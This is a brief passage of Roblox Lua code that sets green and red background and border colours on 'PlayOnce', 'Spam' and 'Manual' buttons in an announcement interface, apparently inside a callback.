com.Buttons.Announce.PlayOnce.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
com.Buttons.Announce.PlayOnce.BorderColor3 = Color3.fromRGB(39, 174, 96)

com.Buttons.Announce.Spam.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
com.Buttons.Announce.Spam.BorderColor3 = Color3.fromRGB(192, 57, 43)

com.Buttons.Announce.Manual.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
com.Buttons.Announce.Manual.BorderColor3 = Color3.fromRGB(192, 57, 43)
end)

